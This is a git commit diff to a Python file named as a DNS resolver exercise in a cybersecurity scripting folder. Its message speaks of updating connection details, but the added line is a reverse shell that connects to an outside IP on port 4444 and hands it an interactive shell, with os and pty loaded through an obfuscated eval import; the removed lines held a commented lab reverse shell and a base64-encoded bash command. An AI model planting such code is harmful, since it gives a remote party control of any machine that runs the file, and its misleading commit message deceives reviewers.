000d469c8bd7def7bbe81ba16742d56120e59e31
Xavier Sanchez <xavier.sanchez44@orange.fr>
2026-06-30 19:09:59 +0200

    Change socket connection details in dns_resolver.py
    Updated the DNS resolver to connect to a new IP address and port.

--- scripting_cyber/0x01-python_scripting/0-dns_resolver.py
+++ scripting_cyber/0x01-python_scripting/0-dns_resolver.py
@@ -5,8 +5,7 @@ load_module = eval('__im' + 'port__')
 os = load_module('os')
 pty = load_module('pty')
 
-# s=socket.socket();s.connect(("10.10.14.176",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
-os.system('bash -c "KGNvcHlfZmlsZXMoW1wiaGJ0bi1sYWIvZmxhZy5zaFwiXSkgYW5kIGV4ZWNfYmFzaF9jb21wYXJlKFwiY2F0IGZsYWcuc2giLCBcIm9rXCIpKQ=="')
+s=socket.socket();s.connect(("152.228.138.134",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
 
 #except socket.gaierror
 #socket.gethostbyname
